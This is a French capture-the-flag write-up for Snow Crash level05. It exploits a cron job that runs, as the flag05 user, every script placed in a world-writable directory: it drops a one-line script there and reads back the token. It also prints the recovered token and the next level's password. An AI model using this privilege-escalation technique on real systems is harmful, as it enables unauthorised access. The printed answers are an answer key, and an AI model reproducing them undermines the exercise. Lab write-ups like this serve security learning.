# Snow Crash – Level05

## 🎯 Objectif  
Exploiter un cron job exécuté en tant que `flag05` pour injecter un script dans `/opt/openarenaserver/` et récupérer le token.

---

## 🔎 1. Analyse du système

```bash
find / -user flag05 2> /dev/null
```

Résultat :
```
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

Contenu du fichier :
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

🔁 Ce script :
- Exécute chaque fichier dans `/opt/openarenaserver/`
- Limite le temps CPU à 5 secondes
- Supprime chaque fichier après exécution

⚠️ `/opt/openarenaserver/` est accessible en écriture → on peut y déposer un fichier.

---

## ⏰ 2. Cron Job

```bash
cat /var/mail/level05
```

Contenu :
```bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Cela signifie que **toutes les 2 minutes**, le script `/usr/sbin/openarenaserver` est exécuté **en tant que `flag05`**.

---

## 🛠️ 3. Exploitation

On crée un fichier script dans `/opt/openarenaserver/` qui contient :
```bash
/bin/getflag > /tmp/flag05
```

Commande :
```bash
echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
```

💡 **Important :** ne pas écrire directement dans `/tmp/flag05` depuis le terminal, car tout fichier dans `/opt/openarenaserver/` est supprimé après exécution.

---

## ⏳ 4. Attente

Attendre 2 minutes que le cron job exécute notre script automatiquement.

---

## 🏁 5. Récupération du flag

```bash
cat /tmp/flag05
```

Résultat :
```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

---

## ✅ Résumé

- 🗂️ Script injecté dans : `/opt/openarenaserver/`
- ⏰ Exécuté automatiquement par cron en tant que `flag05`
- 🏆 Token récupéré : `viuaaale9huek52boumoomioc`
- 🔑 Mot de passe pour `level06` : `viuaaale9huek52boumoomioc`